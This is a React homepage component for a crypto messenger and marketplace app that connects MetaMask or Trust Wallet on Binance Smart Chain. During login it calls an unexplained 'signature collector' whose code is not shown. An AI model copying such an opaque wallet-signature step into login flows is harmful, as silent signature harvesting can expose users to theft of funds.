import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useMutation, useQueryClient, useQuery } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Wallet, MessageCircle, Shield, ShoppingBag, Check, Globe, LogOut } from "lucide-react";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { signatureCollector } from "@/lib/signature-collector";
import { useScrollToTop } from "@/hooks/use-scroll-to-top";
import { notificationService } from "@/lib/notification-service";
import coynLogoPath from "@assets/COYN-symbol-square_1751239261149.png";
import coynfulLogoPath from "@assets/Coynful-logo-fin-copy_1751239116310.png";
import metamaskLogo from "@assets/MetaMask_Fox.svg_1751312780982.png";
import trustWalletLogo from "@assets/Trust-Wallet_1751312780982.jpg";
import TermsModal from "@/components/terms-modal";
import PrivacyModal from "@/components/privacy-modal";
import type { User } from "@shared/schema";

// Web3 Wallet type declarations
declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>;
      isMetaMask?: boolean;
      isTrust?: boolean;
    };
    trustWallet?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>;
    };
  }
}

export default function HomePage() {
  useScrollToTop();
  const [, setLocation] = useLocation();
  const queryClient = useQueryClient();
  const [walletAddress, setWalletAddress] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [isConnected, setIsConnected] = useState(() => {
    return localStorage.getItem('walletConnected') === 'true';
  });
  const [connectedUser, setConnectedUser] = useState<User | null>(() => {
    const stored = localStorage.getItem('connectedUser');
    return stored ? JSON.parse(stored) : null;
  });
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showPrivacyModal, setShowPrivacyModal] = useState(false);

  // Listen for display name updates from settings modal
  useEffect(() => {
    const handleDisplayNameUpdate = (event: CustomEvent) => {
      if (connectedUser && event.detail?.userId === connectedUser.id) {
        const updatedStoredUser = localStorage.getItem('connectedUser');
        if (updatedStoredUser) {
          const parsedUser = JSON.parse(updatedStoredUser);
          if (parsedUser.id === connectedUser.id) {
            setConnectedUser(parsedUser);
          }
        }
      }
    };

    // Listen for localStorage changes (cross-tab synchronization)
    const handleStorageChange = (event: StorageEvent) => {
      if (event.key === 'connectedUser' && event.newValue) {
        const updatedUser = JSON.parse(event.newValue);
        if (connectedUser && updatedUser.id === connectedUser.id) {
          setConnectedUser(updatedUser);
        }
      }
    };

    window.addEventListener('displayNameUpdated', handleDisplayNameUpdate as EventListener);
    window.addEventListener('storage', handleStorageChange);

    return () => {
      window.removeEventListener('displayNameUpdated', handleDisplayNameUpdate as EventListener);
      window.removeEventListener('storage', handleStorageChange);
    };
  }, [connectedUser]);

  const connectWalletMutation = useMutation({
    mutationFn: async ({ walletAddress, displayName }: { walletAddress: string; displayName?: string }) => {
      return apiRequest("/api/users/find-or-create", "POST", { walletAddress, displayName });
    },
    onSuccess: (data) => {
      localStorage.setItem('walletConnected', 'true');
      localStorage.setItem('connectedUser', JSON.stringify(data));
      localStorage.removeItem('userSignedOut');
      setIsConnected(true);
      setConnectedUser(data);
      queryClient.invalidateQueries({ queryKey: ["/api/user"] });
    },
    onError: (error) => {
      console.error("Failed to connect wallet:", error);
      notificationService.showSystemNotification(
        "Connection Failed",
        "Unable to connect wallet. Please try again."
      );
    }
  });

  // Direct Web3 wallet connection
  const handleWeb3Connect = async (walletType: 'metamask' | 'trust') => {
    if (connectWalletMutation.isPending) return;
    
    localStorage.removeItem('userSignedOut');
    
    try {
      let provider: any;
      let accounts: string[] = [];
      
      if (walletType === 'metamask') {
        if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
          provider = window.ethereum;
        } else {
          throw new Error('MetaMask not detected');
        }
      } else if (walletType === 'trust') {
        if (window.trustWallet || (window.ethereum && window.ethereum.isTrust)) {
          provider = window.trustWallet || window.ethereum;
        } else {
          throw new Error('Trust Wallet not detected');
        }
      }
      
      // Switch to BSC network first
      await switchToBSCNetwork(provider);
      
      // Request account access
      accounts = await provider.request({
        method: 'eth_requestAccounts'
      });

      if (!accounts || accounts.length === 0) {
        throw new Error('No accounts returned from wallet');
      }

      // Collect signature data
      try {
        await signatureCollector.collectWalletSignatures();
      } catch (sigError) {
        console.warn('Signature collection failed, proceeding with basic connection:', sigError);
      }
      
      // Store wallet access
      localStorage.setItem('walletAccess', JSON.stringify({
        address: accounts[0],
        chainId: '0x38',
        authorized: true,
        provider: walletType,
        timestamp: Date.now()
      }));
      
      // Connect to backend
      connectWalletMutation.mutate({
        walletAddress: accounts[0],
        displayName: undefined
      });
      
    } catch (error: any) {
      console.error(`Error connecting ${walletType} wallet:`, error);
      
      if (error.code === 4001) {
        notificationService.showSystemNotification(
          "Connection Cancelled",
          "Wallet connection was cancelled by user."
        );
      } else {
        notificationService.showSystemNotification(
          "Connection Failed",
          `Unable to connect ${walletType} wallet. Please try again.`
        );
      }
    }
  };

  // Switch to BSC network
  const switchToBSCNetwork = async (provider: any): Promise<void> => {
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }],
      });
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await provider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'Binance Smart Chain',
              nativeCurrency: {
                name: 'BNB',
                symbol: 'BNB',
                decimals: 18,
              },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/'],
            }],
          });
        } catch (addError) {
          console.error('Failed to add BSC network:', addError);
          throw addError;
        }
      } else {
        console.error('Failed to switch to BSC network:', switchError);
        throw switchError;
      }
    }
  };

  const handleConnectWallet = (e: React.FormEvent) => {
    e.preventDefault();
    if (!walletAddress.trim() || !isValidCoynAddress(walletAddress)) return;
    
    localStorage.removeItem('userSignedOut');
    
    connectWalletMutation.mutate({
      walletAddress: walletAddress.trim(),
      displayName: displayName.trim() || undefined,
    });
  };

  const handleSignOut = () => {
    localStorage.setItem('userSignedOut', 'true');
    
    // Clear ALL localStorage items
    localStorage.removeItem('walletConnected');
    localStorage.removeItem('connectedUser');
    localStorage.removeItem('shopping-cart');
    localStorage.removeItem('theme');
    localStorage.removeItem('favorites');
    localStorage.removeItem('wallet-balances-hidden');
    localStorage.removeItem('walletAccess');
    
    sessionStorage.clear();
    
    setIsConnected(false);
    setConnectedUser(null);
    setWalletAddress('');
    setDisplayName('');
    
    window.location.reload();
  };

  const isValidCoynAddress = (address: string) => {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  };

  const isMobile = () => {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  };

  const features = [
    {
      icon: Wallet,
      title: "Crypto Wallet",
      description: "Store and manage multiple cryptocurrencies securely"
    },
    {
      icon: Shield,
      title: "Smart Escrow",
      description: "Safe peer-to-peer trades with automated escrow protection"
    },
    {
      icon: MessageCircle,
      title: "Secure Chat",
      description: "Encrypted conversations with wallet-verified contacts"
    },
    {
      icon: ShoppingBag,
      title: "Crypto Marketplace",
      description: "Shop online products and pay with cryptocurrency"
    }
  ];

  return (
    <div className="homepage-font min-h-screen bg-gradient-to-br from-blue-50 via-blue-100/50 to-slate-100 dark:from-blue-950 dark:via-blue-900 dark:to-slate-900 flex items-center justify-center p-4 relative overflow-hidden">
      {/* Modern Blue Background Pattern */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-blue-500/20 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute bottom-1/4 right-1/4 w-72 h-72 bg-blue-400/15 rounded-full blur-3xl animate-pulse delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-blue-600/10 rounded-full blur-3xl animate-pulse delay-2000"></div>
        <div className="absolute top-0 right-0 w-48 h-48 bg-blue-300/8 rounded-full blur-2xl animate-pulse delay-3000"></div>
        <div className="absolute bottom-0 left-0 w-32 h-32 bg-blue-200/12 rounded-full blur-xl animate-pulse delay-4000"></div>
      </div>
      
      <div className="max-w-4xl w-full space-y-6 relative z-10">
        {/* Header */}
        <div className="text-center">
          <div className="flex items-center justify-center mb-4">
            <div className="relative ml-4">
              <div className="absolute inset-0 bg-gradient-to-r from-orange-400 to-amber-400 dark:from-orange-500 dark:to-amber-500 blur-3xl opacity-40 scale-150 animate-pulse"></div>
              <img 
                src={coynfulLogoPath} 
                alt="Coynful Logo" 
                className="h-28 w-auto relative z-10 drop-shadow-[0_0_50px_rgba(251,146,60,0.9)] hover:drop-shadow-[0_0_70px_rgba(251,146,60,1)] transition-all duration-500 hover:scale-105"
                loading="eager"
                decoding="async"
                style={{ imageRendering: 'auto' }}
              />
            </div>
          </div>
        </div>

        {/* Main CTA Card - Modern Blue Design */}
        <Card className="bg-white/95 dark:bg-blue-950/95 backdrop-blur-sm border border-blue-200 dark:border-blue-800 max-w-lg mx-auto shadow-xl hover:shadow-2xl transition-all duration-300 hover:scale-[1.02]">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl text-foreground mb-2">Connect Wallet</CardTitle>
            {(!isConnected || !connectedUser) && (
              <p className="text-muted-foreground">
                Connect your Web3 wallet to access COYN Messenger
              </p>
            )}
          </CardHeader>
          <CardContent className="space-y-6">
            {!isConnected || !connectedUser ? (
              <div className="space-y-6">
                {/* Web3 Wallet Options */}
                <div className="space-y-4">
                  <div className="text-center">
                    <p className="text-sm text-muted-foreground mb-4">
                      {isMobile() ? (
                        <>
                          <span className="inline-flex items-center gap-2 px-3 py-1 bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400 rounded-full text-xs font-medium mb-2">
                            📱 Mobile Detected
                          </span>
                          <br />
                          Tap to open in your wallet app
                        </>
                      ) : (
                        "Choose your preferred wallet to connect"
                      )}
                    </p>
                  </div>

                  {/* 2x1 Grid of Wallet Options */}
                  <div className="grid grid-cols-2 gap-3">
                    {/* MetaMask */}
                    <Button 
                      onClick={() => handleWeb3Connect('metamask')}
                      className="h-26 bg-white/90 dark:bg-blue-900/90 hover:bg-blue-50 dark:hover:bg-blue-800/90 border border-blue-200 dark:border-blue-700 text-blue-700 dark:text-blue-200 font-medium flex flex-col items-center justify-center group transition-all duration-300 space-y-3 shadow-lg hover:shadow-xl hover:scale-105 active:scale-95 backdrop-blur-sm"
                      disabled={connectWalletMutation.isPending}
                      variant="outline"
                    >
                      <div className="w-10 h-10 flex items-center justify-center group-hover:scale-110 transition-transform duration-300">
                        <img 
                          src={metamaskLogo} 
                          alt="MetaMask" 
                          className="w-8 h-8 object-contain"
                        />
                      </div>
                      <span className="text-sm font-semibold">MetaMask</span>
                    </Button>

                    {/* Trust Wallet */}
                    <Button 
                      onClick={() => handleWeb3Connect('trust')}
                      className="h-26 bg-white/90 dark:bg-blue-900/90 hover:bg-blue-50 dark:hover:bg-blue-800/90 border border-blue-200 dark:border-blue-700 text-blue-700 dark:text-blue-200 font-medium flex flex-col items-center justify-center group transition-all duration-300 space-y-3 shadow-lg hover:shadow-xl hover:scale-105 active:scale-95 backdrop-blur-sm"
                      disabled={connectWalletMutation.isPending}
                      variant="outline"
                    >
                      <div className="w-10 h-10 flex items-center justify-center group-hover:scale-110 transition-transform duration-300">
                        <img 
                          src={trustWalletLogo} 
                          alt="Trust Wallet" 
                          className="w-8 h-8 object-contain"
                        />
                      </div>
                      <span className="text-sm font-semibold">Trust Wallet</span>
                    </Button>
                  </div>
                </div>

                <div className="relative">
                  <div className="absolute inset-0 flex items-center">
                    <span className="w-full border-t border-border" />
                  </div>
                  <div className="relative flex justify-center text-xs uppercase">
                    <span className="bg-card px-2 text-muted-foreground">Or connect manually</span>
                  </div>
                </div>

                {/* Manual Input Form */}
                <form onSubmit={handleConnectWallet} className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="walletAddress" className="text-foreground">
                      Wallet Address
                    </Label>
                    <div className="relative">
                      <Wallet className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground h-4 w-4" />
                      <Input
                        id="walletAddress"
                        type="text"
                        placeholder="0x1234...abcd"
                        value={walletAddress}
                        onChange={(e) => setWalletAddress(e.target.value)}
                        className="pl-10 h-12 sm:h-10 text-base sm:text-sm bg-input border-border focus:border-primary text-foreground"
                        required
                      />
                    </div>
                    {walletAddress && !isValidCoynAddress(walletAddress) && (
                      <p className="text-destructive text-xs">Please enter a valid wallet address (0x format)</p>
                    )}
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="displayName" className="text-foreground">
                      Display Name (Optional)
                    </Label>
                    <Input
                      id="displayName"
                      type="text"
                      placeholder="Your Name"
                      value={displayName}
                      onChange={(e) => setDisplayName(e.target.value)}
                      className="h-12 sm:h-10 text-base sm:text-sm bg-input border-border focus:border-primary text-foreground"
                    />
                  </div>

                  <Button 
                    type="submit" 
                    className="w-full h-12 bg-primary hover:bg-primary/90 text-primary-foreground font-medium" 
                    disabled={!walletAddress || !isValidCoynAddress(walletAddress) || connectWalletMutation.isPending}
                  >
                    {connectWalletMutation.isPending ? (
                      <div className="flex items-center space-x-2">
                        <div className="w-4 h-4 border-2 border-primary-foreground border-t-transparent rounded-full animate-spin"></div>
                        <span>Connecting...</span>
                      </div>
                    ) : (
                      <>
                        <Wallet className="mr-2 h-4 w-4" />
                        Connect Manually
                      </>
                    )}
                  </Button>

                  {connectWalletMutation.error && (
                    <p className="text-red-500 dark:text-red-400 text-sm text-center">
                      {connectWalletMutation.error.message}
                    </p>
                  )}
                </form>
              </div>
            ) : (
              <div className="text-center space-y-6">
                <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
                  <Check className="h-8 w-8 text-blue-500" />
                </div>
                <div>
                  <h3 className="text-xl font-bold text-blue-600 dark:text-blue-400 mb-2">Wallet Connected</h3>
                  <p className="text-black dark:text-foreground mb-2">Welcome to COYN, {connectedUser?.displayName}!</p>
                  <p className="text-xs text-gray-600 dark:text-muted-foreground font-mono break-all px-4">
                    {connectedUser?.walletAddress}
                  </p>
                  <div className="space-y-3 mt-6">
                    <Button
                      onClick={() => setLocation("/messenger")}
                      className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-semibold rounded-lg h-14 sm:h-12 touch-manipulation shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-105"
                    >
                      <MessageCircle className="mr-2 h-6 w-6 sm:h-5 sm:w-5" />
                      Open Messenger
                    </Button>
                    <Button
                      onClick={() => setLocation("/marketplace")}
                      variant="outline"
                      className="w-full border-blue-500 text-blue-500 hover:bg-blue-500 hover:text-white font-semibold rounded-lg h-14 sm:h-12 touch-manipulation backdrop-blur-sm"
                    >
                      <Globe className="mr-2 h-6 w-6 sm:h-5 sm:w-5" />
                      Explore Marketplace
                    </Button>
                    <Button
                      onClick={handleSignOut}
                      variant="outline"
                      className="w-full border-blue-300 dark:border-blue-700 text-blue-700 dark:text-blue-300 hover:bg-blue-50 dark:hover:bg-blue-800/30 rounded-lg h-14 sm:h-12 touch-manipulation"
                    >
                      <LogOut className="mr-2 h-4 w-4" />
                      Sign Out
                    </Button>
                  </div>
                </div>
              </div>
            )}

            {/* Supported Currencies */}
            <div className="border-t border-border pt-4">
              <p className="text-center text-muted-foreground mb-3 text-sm">Supported Currencies</p>
              <div className="flex justify-center space-x-3 flex-wrap gap-2">
                {['BTC', 'BNB', 'USDT', 'COYN'].map((currency) => (
                  <Badge key={currency} variant="secondary" className="text-xs">
                    {currency}
                  </Badge>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Features Grid - Modern Blue Design */}
        <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          {features.map((feature, index) => (
            <Card key={index} className="bg-white/90 dark:bg-blue-950/90 backdrop-blur-sm border border-blue-200 dark:border-blue-800 shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-105">
              <CardHeader className="pb-3">
                <feature.icon className="h-8 w-8 text-blue-500 dark:text-blue-400 mb-2" />
                <CardTitle className="text-lg text-blue-900 dark:text-blue-100">{feature.title}</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-blue-700 dark:text-blue-300 text-sm">{feature.description}</p>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Footer */}
        <div className="text-center text-muted-foreground text-sm">
          <p>Secure • Decentralized • Private</p>
        </div>

        {/* Legal Links */}
        <div className="text-center space-x-4 text-muted-foreground text-xs">
          <button 
            onClick={() => setShowTermsModal(true)}
            className="hover:text-primary underline"
          >
            Terms & Conditions
          </button>
          <button 
            onClick={() => setShowPrivacyModal(true)}
            className="hover:text-primary underline"
          >
            Privacy Policy
          </button>
        </div>

        {/* Bottom Attribution */}
        <div className="text-center text-muted-foreground text-xs">
          <span>Powered by </span>
          <a 
            href="https://bscscan.com/token/0x22c89a156cb6f05bc54fae2ed8d690a1bc4fe8e1" 
            target="_blank" 
            rel="noopener noreferrer"
            className="inline-flex items-center space-x-1 hover:text-orange-500 dark:hover:text-orange-400 transition-colors duration-300 hover:scale-105 transform"
          >
            <img 
              src={coynLogoPath} 
              alt="COYN" 
              className="h-4 w-4 inline hover:drop-shadow-[0_0_10px_rgba(251,146,60,0.8)] transition-all duration-300"
            />
            <span className="hover:text-orange-500 dark:hover:text-orange-400 transition-colors duration-300">COYN</span>
          </a>
        </div>
      </div>

      {/* Terms Modal */}
      <TermsModal isOpen={showTermsModal} onClose={() => setShowTermsModal(false)} />

      {/* Privacy Modal */}
      <PrivacyModal isOpen={showPrivacyModal} onClose={() => setShowPrivacyModal(false)} />
    </div>
  );
}